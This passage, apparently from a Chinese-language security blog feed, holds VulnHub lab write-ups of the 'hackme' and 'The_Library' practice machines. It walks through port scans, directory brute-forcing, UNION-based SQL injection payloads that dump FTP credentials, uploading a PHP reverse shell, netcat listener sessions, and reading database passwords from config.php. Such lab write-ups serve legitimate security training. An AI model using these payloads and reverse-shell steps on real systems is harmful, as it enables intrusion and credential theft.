webshell，记得修改 IP 和端口，然后提前开启监听，尝试不改后缀直接上传。</p><p>竟然没有过滤，直接上传成功了。尝试访问：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.1</span>.<span class="hljs-number">1.143</span><span class="hljs-regexp">/uploads/</span>php-reverse-shell.php<br></code></pre></td></tr></table></figure><p>反弹成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/hackme]<br>└─$ sudo nc -lvnp 1234                      <br>listening on [any] 1234 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.143] 42294<br>Linux hackme 4.18.0-16-generic <span class="hljs-comment">#17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br> 23:04:21 up  2:04,  0 <span class="hljs-built_in">users</span>,  load average: 0.06, 0.46, 0.27<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:0c:29:4f:34:38 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.1.1.143/24 brd 192.1.1.255 scope global dynamic ens33</span><br><span class="hljs-string">       valid_lft 1529sec preferred_lft 1529sec</span><br><span class="hljs-string">    inet6 fe80::20c:29ff:fe4f:3438/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">/usr/bin/python</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@hackme:/$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">[sudo] password for www-data:</span><br></code></pre></td></tr></table></figure><p>看一下 passwd 文件中有哪些用户，然后尝试能不能用刚才碰撞出的网站用户的密码来切换登录。网站是连接了数据库的，那么还需要去网站根目录找一下数据库配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@hackme:/var/www/html$ <span class="hljs-built_in">cat</span> config.php<br><span class="hljs-built_in">cat</span> config.php<br>&lt;?php<br>/* Database credentials. Assuming you are running MySQL<br>server with default setting (user <span class="hljs-string">&#x27;root&#x27;</span> with no password) */<br>define(<span class="hljs-string">&#x27;DB_SERVER&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_USERNAME&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;hackme1qaz@WSX&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;webapphacking&#x27;</span>);<br> <br>/* Attempt to connect to MySQL database */<br><span class="hljs-variable">$link</span> = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);<br> <br>// Check connection<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$link</span> === <span class="hljs-literal">false</span>)&#123;<br>    die(<span class="hljs-string">&quot;ERROR: Could not connect. &quot;</span> . mysqli_connect_error());<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>试了一遍都失败了，去用户根目录看看有没有什么敏感信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@hackme:/home/hackme$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 48K<br>1316877 drwxr-xr-x 5 hackme hackme 4.0K Mar 25  2019 .<br>1310721 drwxr-xr-x 4 root   root   4.0K Mar 26  2019 ..<br>1316887 -rw------- 1 hackme hackme 5.7K Mar 27  2019 .bash_history<br>1316878 -rw-r--r-- 1 hackme hackme  220 Sep 12  2018 .bash_logout<br>1316879 -rw-r--r-- 1 hackme hackme 3.7K Sep 12  2018 .bashrc<br>1316881 drwx------ 2 hackme hackme 4.0K Mar 13  2019 .cache<br>1316883 drwx------ 3 hackme hackme 4.0K Mar 13  2019 .gnupg<br>1316888 drwxrwxr-x 3 hackme hackme 4.0K Mar 21  2019 .<span class="hljs-built_in">local</span><br>1316889 -rw------- 1 root   root   5.5K Mar 25  2019 .mysql_history<br>1316880 -rw-r--r-- 1 hackme hackme  807 Sep 12  2018 .profile<br>1316885 -rw-r--r-- 1 hackme hackme    0 Mar 13  2019 .sudo_as_admin_successful<br>www-data@hackme:/home/hackme$ <span class="hljs-built_in">cd</span> ../legacy<br><span class="hljs-built_in">cd</span> ../legacy<br>www-data@hackme:/home/legacy$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 20K<br>1316893 drwxr-xr-x 2 root root 4.0K Mar 26  2019 .<br>1310721 drwxr-xr-x 4 root root 4.0K Mar 26  2019 ..<br>1317196 -rwsr--r-x 1 root root 8.3K Mar 26  2019 touchmenot<br>www-data@hackme:/home/legacy$ strings touchmenot<br>strings touchmenot<br><br>Command <span class="hljs-string">&#x27;strings&#x27;</span> not found, but can be installed with:<br><br>apt install binutils<br>Please ask your administrator.<br></code></pre></td></tr></table></figure><p>没法直接看，运行一下试试？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@hackme:/home/legacy$ ./touchmenot<br>./touchmenot<br>root@hackme:/home/legacy<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>竟然直接变成 root 了，有点抽象。</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>The_Library 靶机</title>
    <link href="/2023/08/6d61acd6e537.html"/>
    <url>/2023/08/6d61acd6e537.html</url>
    
    <content type="html"><![CDATA[<h1 id="The-Library-靶机"><a href="#The-Library-靶机" class="headerlink" title="The_Library 靶机"></a>The_Library 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/The_Library]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.142              <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 11:07 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.142<br>Host is up (0.00031s latency).                                                                                      <br>Not shown: 55531 filtered tcp ports (no-response), 10002 closed tcp ports (reset)                                   <br>PORT   STATE SERVICE                                                                                                <br>21/tcp open  ftp                                                                                                    <br>80/tcp open  http                                                                                                   <br>MAC Address: 00:0C:29:E5:3F:72 (VMware)                                                                                    <br></code></pre></td></tr></table></figure><p>开放了 21 和 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/The_Library]<br>└─$ sudo nmap -sT -sV -sC -O -p21,80 192.1.1.142             <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 11:08 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.142<br>Host is up (0.00026s latency).<br><br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.3<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>MAC Address: 00:0C:29:E5:3F:72 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.9 (97%), Linux 3.16 - 4.6 (95%), Linux 4.2 (94%), Linux 3.13 (93%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (93%), Linux 4.10 (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Linux 3.2 - 3.10 (93%), Linux 3.2 - 3.16 (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: OS: Unix<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/The_Library]<br>└─$ sudo nmap --script=vuln -p21,80 192.1.1.142             <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 11:10 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.142<br>Host is up (0.00022s latency).<br><br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>80/tcp open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">MAC Address: 00:0C:29:E5:3F:72 (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 352.05 seconds</span><br></code></pre></td></tr></table></figure><p>没有明显的漏洞和网站路径</p><p>尝试 ftp 匿名登录，失败，那只能着眼于 Web 渗透</p><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>查看 Web 界面的同时使用目录爆破。Web 界面 <code>是Apache2 Ubuntu Default Page</code>，等一等目录爆破的结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/The_Library]<br>└─$ sudo dirsearch -u http://192.1.1.142                                                                        <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.142/_23-08-15_11-16-53.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-15_11-16-53.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.142/<br><br>[11:16:53] Starting: <br>[11:16:54] 403 -  297B  - /.ht_wsr.txt                                     <br>[11:16:54] 403 -  300B  - /.htaccess.bak1                                  <br>[11:16:54] 403 -  300B  - /.htaccess.orig<br>[11:16:54] 403 -  300B  - /.htaccess.save<br>[11:16:54] 403 -  302B  - /.htaccess.sample<br>[11:16:54] 403 -  298B  - /.htaccessBAK<br>[11:16:54] 403 -  301B  - /.htaccess_extra<br>[11:16:54] 403 -  298B  - /.htaccess_sc<br>[11:16:54] 403 -  300B  - /.htaccess_orig<br>[11:16:54] 403 -  299B  - /.htaccessOLD2<br>[11:16:54] 403 -  298B  - /.htaccessOLD<br>[11:16:54] 403 -  290B  - /.htm                                            <br>[11:16:54] 403 -  291B  - /.html<br>[11:16:54] 403 -  296B  - /.htpasswds<br>[11:16:54] 403 -  300B  - /.htpasswd_test                                  <br>[11:16:54] 403 -  297B  - /.httr-oauth<br>[11:16:55] 403 -  290B  - /.php                                            <br>[11:16:55] 403 -  291B  - /.php3                                           <br>[11:17:11] 200 -   11KB - /index.html                                       <br>[11:17:12] 200 -    2KB - /library.php                                      <br>[11:17:19] 403 -  300B  - /server-status/                                   <br>[11:17:19] 403 -  299B  - /server-status<br></code></pre></td></tr></table></figure><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>看到一个有意思的文件 <code>library.php</code> ，点击一下可点击按钮</p><p><img src="/pic/6631ac28719ec11df0e6002b9cba5703_MD5.png"></p><p>看看 burp suite 抓到的包</p><p><img src="/pic/7bb52814fe54f4e57a6e26f1f16631fa_MD5.png"></p><p>仔细观察，有几个比较在意的点，虽然提示没有信息，但是 We couldn’t find any information for 之后理论上应该跟着一个对象，尤其是最后还有个句号也是暗示。大概率这里存在攻击路径，接下来我尝试了对 lastviewed 的值和 country 的值进行模糊测试，但是结果不理想，看到回应源码中有个算法标识</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- ripemd160 --&gt;</span><br></code></pre></td></tr></table></figure><p>根据这个算法标志我尝试了对 lastviewed 的值和 country 的值进行加密，但依然没有得到结果，在这里卡了蛮久的。反思了一下为什么自己这里没有办法进一步想到攻击路径，一方面最近有点浮躁，思考不够深入，加上对于注入点的理解其实还是有偏差，虽然观察到了注入点却没有放在心上，只在最明显的注入点上进行了测试</p><p><img src="/pic/c85675229319fef95840c3d7520290ad_MD5.png"></p><p>注入点判断是一方面，而对于注入点如何构造合适的 payload 也是对我们能力的一个考验</p><p>我尝试了 burp suite 中自带的 sql 注入的字典和 fuzz 的字典，但均没有收获</p><p>直接使用 sqlmap 也有问题（还是不太清除 sqlmap 怎么指定注入点，还是得抽时间专门学一下 sqlmap 的使用），还把靶机的服务给搞崩了，只能重启靶机</p><p>这次用一下 seclist 中的字典</p><p><img src="/pic/ce57509ec439289d73c2cc90048984e2_MD5.png"></p><p>发现一个非常有意思的事情，当构造是 0 的时候，响应内容里多了个Norway</p><p><img src="/pic/c6acdbccc6a18f2f54902d0f2b20ca15_MD5.png"></p><p>继续构造 0 and 1&#x3D;1 的时候有回显，构造 0 and 1&#x3D;2 的时候无回显（Norway 为空）。这就确定了是存在注入的，而且是数字型的注入，接下来就是很经典的操作了，先使用 ordy by 确定列数</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>order by <span class="hljs-number">2</span><br><span class="hljs-symbol">0 </span>order by <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/pic/ebe7b81f1dbfae93bd0b77346a92a716_MD5.png"></p><p>确定了列数为 1，接下来我们将继续构造</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()<br># 这里发现直接就可以看到回显，如果直接看不到回显的话，我们需要将<span class="hljs-number">0</span>的位置换成<span class="hljs-number">1</span>，人为构造出前面无回显结果，防止<span class="hljs-keyword">union</span>的结果被覆盖（显示位上被覆盖）<br><br><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p><img src="/pic/ca8a18b73c0837b71c91aa4090b9f261_MD5.png"></p><p>网站是 PHP 搭建的，猜测可能是 MySQL 数据库，先按 MySQL 数据库试一试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;library&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/pic/b2c8860e882cf79e3b7b07e3b1c6b7d6_MD5.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 返回结果</span><br>access,countries<br></code></pre></td></tr></table></figure><p>的确就是 MySQL 数据库，继续构造 SQL 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;access&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/pic/6e6025ea8f4cae0dfa6f995699353b7c_MD5.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># 返回结果</span><br><span class="hljs-built_in">id</span>,service,username,password<br></code></pre></td></tr></table></figure><p>到了振奋人心的时刻总算能看到表里的内容了，构造如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(id,service,<span class="hljs-number">0x2D</span>,username,<span class="hljs-number">0x2D</span>,password) <span class="hljs-keyword">from</span> access<br></code></pre></td></tr></table></figure><p><img src="/pic/30f3a17ae0b3905274e6df5be080be50_MD5.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 返回结果</span><br><span class="hljs-number">1</span><span class="hljs-keyword">ftp</span>-globus-AroundTheWor<br></code></pre></td></tr></table></figure><p>确定了 ftp 的用户名和密码，登录上去看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/The_Library]<br>└─$ ftp 192.1.1.142<br>Connected to 192.1.1.142.<br>220 (vsFTPd 3.0.3)<br>Name (192.1.1.142:kali): globus<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||43525|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 1001     1001         4096 Jul 22  2019 html<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">cd</span> html<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||58705|)<br>150 Here comes the directory listing.<br>-rwxrwxrwx    1 0        0           11321 Jul 17  2019 index.html<br>-rwxrwxrwx    1 0        0            2831 Jul 22  2019 library.php<br>-rwxrwxrwx    1 0        0            3172 Jul 21  2019 style.css<br>226 Directory send OK.<br></code></pre></td></tr></table></figure><p>是网站根目录啊，那直接上传个 PHP 反弹 shell 的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; put php-reverse-shell.php <br><span class="hljs-built_in">local</span>: php-reverse-shell.php remote: php-reverse-shell.php<br>229 Entering Extended Passive Mode (|||53363|)<br>150 Ok to send data.<br>100% |***********************************************************************|  3461       48.53 MiB/s    00:00 ETA<br>226 Transfer complete.<br>3461 bytes sent <span class="hljs-keyword">in</span> 00:00 (7.08 MiB/s)<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||23655|)<br>150 Here comes the directory listing.<br>-rwxrwxrwx    1 0        0           11321 Jul 17  2019 index.html<br>-rwxrwxrwx    1 0        0            2831 Jul 22  2019 library.php<br>-rw-------    1 1001     1001         3461 Aug 15 10:55 php-reverse-shell.php<br>-rwxrwxrwx    1 0        0            3172 Jul 21  2019 style.css<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">chmod</span> 777 php-reverse-shell.php<br>200 SITE CHMOD <span class="hljs-built_in">command</span> ok.<br></code></pre></td></tr></table></figure><p>上传成功还得修改下文件权限</p><h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>攻击机开启监听后，浏览器访问后成功反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/The_Library]<br>└─$ sudo nc -lvnp 1234                         <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 1234 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.142] 40564<br>Linux ubuntu 4.4.0-21-generic <span class="hljs-comment">#37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br> 10:57:17 up 25 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.18, 0.41<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:0c:29:e5:3f:72 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.1.1.142/24 brd 192.1.1.255 scope global dynamic ens33</span><br><span class="hljs-string">       valid_lft 1157sec preferred_lft 1157sec</span><br><span class="hljs-string">    inet6 fe80::c618:cfcc:b9c1:293c/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ 